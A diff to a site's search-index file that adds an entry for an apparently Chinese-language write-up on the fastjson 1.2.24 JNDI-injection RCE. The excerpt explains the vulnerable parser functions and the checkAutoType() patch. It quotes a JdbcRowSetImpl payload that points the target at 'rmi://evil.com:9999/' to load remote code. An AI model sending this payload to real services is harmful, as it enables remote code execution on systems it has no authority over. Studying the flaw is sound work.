@@ -173,9 +173,9 @@ var store = [{
         "url": "/vul/hikvision/",
         "teaser": null
       },{
-        "title": "Jndi",
-        "excerpt":" ","categories": [],
-        "tags": [],
-        "url": "/JNDI/",
+        "title": "fastjson-1.2.24-RCE",
+        "excerpt":"Fastjson-1.2.24-RCE 0x00 漏洞概述 fastjson是一个由阿里巴巴开发的Java库，用于处理json数据。fastjson在17年的1.2.24版本首次爆出了一个RCE漏洞，原理是jndi注入。很快阿里发布了新的版本1.2.25，通过checkAutoType()这个函数来防御这个漏洞。 后来针对checkAutoType()这个函数，出现了一系列的绕过手段以及修复补丁。 0x01 漏洞原理 fastjson RCE关键函数 DefaultJSONParser. parseObject() #解析传入的 json 字符串提取不同的 key 进行后续的处理。 TypeUtils. loadClass() #根据传入的类名，生成类的实例。 JavaBeanDeserializer. Deserialze() #依次调用 @type 中传入类的对象公有 set\\get\\is 方法。 ParserConfig. checkAutoType() #阿里后续添加的防护函数，用于在 loadclass 前检查传入的类是否合法。 Payload { \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://evil.com:9999/\", \"autoCommit\":true } } 该Payload有效的原理是：fastjson 在处理以@type形式传入的类的时候，会默认调用该类的共有 set\\get\\is 函数，因此我们在寻找利用类的时候思路如下： 1、类的成员变量我们可以控制； 2、想办法在调用类的某个set\\get\\is函数的时候造成命令执行。 于是便找到了 JdbcRowSetImpl 类，该类在 setAutoCommit 函数中会对成员变量...","categories": ["vul"],
+        "tags": ["fastjson","web","java"],
+        "url": "/vul/fastjson/",
         "teaser": null
       }]
